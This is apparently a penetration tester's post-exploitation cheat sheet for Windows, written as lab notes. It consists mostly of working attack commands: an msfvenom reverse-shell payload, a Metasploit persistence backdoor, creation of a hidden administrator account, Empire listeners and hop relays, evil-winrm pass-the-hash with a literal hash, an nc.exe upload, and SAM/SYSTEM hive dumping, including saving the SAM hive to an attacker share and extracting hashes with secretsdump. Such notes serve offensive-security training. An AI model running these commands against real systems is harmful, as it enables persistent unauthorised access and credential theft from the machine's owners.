# Maintaining Access

### Generating a Payload w/ msfvenom

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe

use exploit/multi/handler

Background the meterpreter shell
```

### Run the Persistence Module

```
use exploit/windows/local/persistence

set session 1
```

If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit `multi handler` and setting the payload to `windows/meterpreter/reverse_tcp` allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.

## Add a user

```
net user hacker password123 /add
```

Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:

```
net localgroup Administrators USERNAME /add
net localgroup "Remote Management Users" USERNAME /add
```

## RDP

```
xfreerdp /v:IP /u:USERNAME /p:PASSWORD
```

These switches are particularly useful:

- /dynamic-resolution -- allows us to resize the window, adjusting the resolution of the target in the process
- /size:WIDTHxHEIGHT -- sets a specific size for targets that don't resize automatically with /dynamic-resolution
- +clipboard -- enables clipboard support
- /drive:LOCAL_DIRECTORY,SHARE_NAME -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called share, you could use: `/drive:.,share`, with the period (.) referring to the current directory

When creating a shared drive, this can be accessed either from the command line as `\\tsclient\`, or through File Explorer under "This PC":

```
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

## Empire

```bash
sudo apt install powershell-empire starkiller

sudo powershell-empire server

powershell-empire client

starkiller (emprieadmin:password123)
```

### Client

```
uselistener http
set Name CLIHTTP
set Host IP
set Port 8000
execute
back or main
```

List and kill listeners

```
listeners

kill LISTENER_NAME
```

Create stager multi/bash

### Empire Hop Listeners

```
uselistener http_hop
```

Specifically we need:

- A RedirectListener -- this is a regular listener to forward any received agents to. Think of the hop listener as being something like a relay on the compromised server; we still need to catch it with something! You could use the listener you set up earlier for this, or create an entirely new HTTP listener using the same steps we used earlier. Make sure that this matches up with the name of an already active listener though!
- A Host -- the IP of the compromised webserver (.200).
- A Port -- this is the port which will be used for the webserver hosting our hop files. Pick a random port here (above 15000), but remember it!

### Empire Modules

```bash
usemodule powershell/privesc/sherlock
```

## Evil-winrm

Share folder in memory

```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.198.150 -s ./tools/Pivoting/Windows/
```

Upload file

```
upload /usr/share/windows-binaries/nc.exe c:\windows\temp\nc.exe
```

## Exfiltration Techniques & Post Exploitation

Local user hashes are stored in the Windows Registry whilst the computer is running -- specically in the HKEY_LOCAL_MACHINE\SAM hive. This can also be found as a file at C:\Windows\System32\Config\SAM, however, this should not be readable whilst the computer is running. To dump the hashes locally, we first need to save the SAM hive:

```
reg.exe save HKLM\SAM sam.bak
```

This saves the hive as a file called "sam.bak" in the current directory.

Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:

```
reg.exe save HKLM\SYSTEM system.bak
```

Transfer the files over SMB for example

reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak

Retrieve the hashes

```
python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL
```
